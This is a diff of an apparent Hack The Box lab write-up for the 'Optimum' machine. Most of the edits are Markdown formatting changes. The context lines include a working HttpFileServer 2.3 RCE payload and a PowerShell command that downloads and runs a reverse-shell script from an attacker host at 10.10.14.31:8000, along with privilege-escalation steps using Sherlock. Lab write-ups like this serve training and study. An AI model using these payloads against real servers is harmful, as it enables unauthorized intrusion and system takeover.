@@ -1,6 +1,7 @@
 ---
 title:     "Hack The Box - Optimum"
 tags: [windows,easy,sherlock,empire,rce,nishang]
+categories: HackTheBox OSCP-Like
 ---
 
 ![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-optimum/1.png)
@@ -12,7 +13,7 @@ Link : <https://www.hackthebox.eu/home/machines/profile/6>
 
 Lets Begin with our Initial Nmap Scan.
 
-## Nmap Scan Results:
+## Nmap Scan Results
 
 ```
 PORT   STATE SERVICE VERSION
@@ -27,7 +28,7 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 ```
 Only one port is opened which is ``HTTP``
 
-## HTTP:
+## HTTP Enumeration
 
 From the nmap result itself we know that the webpage is ``HttpFileServer httpd 2.3``
 ![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-optimum/2.png)
@@ -40,7 +41,7 @@ Since we know the version I started searching for exploits available for the ver
 >https://www.exploit-db.com/exploits/34668
 
 From the above exploit we can do ``RCE`` on the url.
-We can execute it by using ``/?search=%00{.exec|cmd.}`` on the url
+We can execute it by using `/?search=%00{.exec|cmd.}` on the url
 
 Now we need to get a reverse shell from this.
 
@@ -71,6 +72,8 @@ I copied one of the example and changed it to my IP and paste it in bottom of th
 ![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-optimum/4.png)<br/>
 This not only load the module but also the shell give me a callback.
 
+## Getting User Shell
+
 We need to start ``python`` server inorder to download it to the box. Started my ``netcat`` listener too.<br/>
 ![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-optimum/5.png)<br/>
 
@@ -82,7 +85,9 @@ I used Powershell to do that
 
 I added the location of the ``powershell.exe`` in windows along with the command and we already know for ``RCE``.
 
-```/?search=%00{.exec|c:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.14.31:8000/Invoke-PowerShellTcp.ps1').}```
+```
+/?search=%00{.exec|c:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.14.31:8000/Invoke-PowerShellTcp.ps1').}
+```
 
 With URL encoded I passed it to burp.<br/>
 ![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-optimum/6.png)
@@ -94,7 +99,7 @@ At the sametime I got the shell in ``nc listener``
 
 ![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-optimum/8.png)
 
-## Privilege Escalation:
+## Privilege Escalation
 
 Once I got a shell the first thing I check is ``systeminfo``
 
@@ -107,9 +112,7 @@ So we can use [Sherlock](https://github.com/rasta-mouse/Sherlock) to find the mi
 
 >Sherlock - PowerShell script to quickly find missing software patches for local privilege escalation vulnerabilities.
 
-
-
-``Sherlock.ps1``
+`Sherlock.ps1`
 
 So we need to ``Find AllVulns`` Copy that and paste it in the bottom of the file as we did before.<br/>
 ![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-optimum/9.png)<br/>
@@ -173,7 +176,7 @@ On the box:
 
 We are System!!
 
-# Method II (Using Metasploit):
+## Method II (Using Metasploit)
 
 > https://www.rapid7.com/db/modules/exploit/windows/http/rejetto_hfs_exec
 
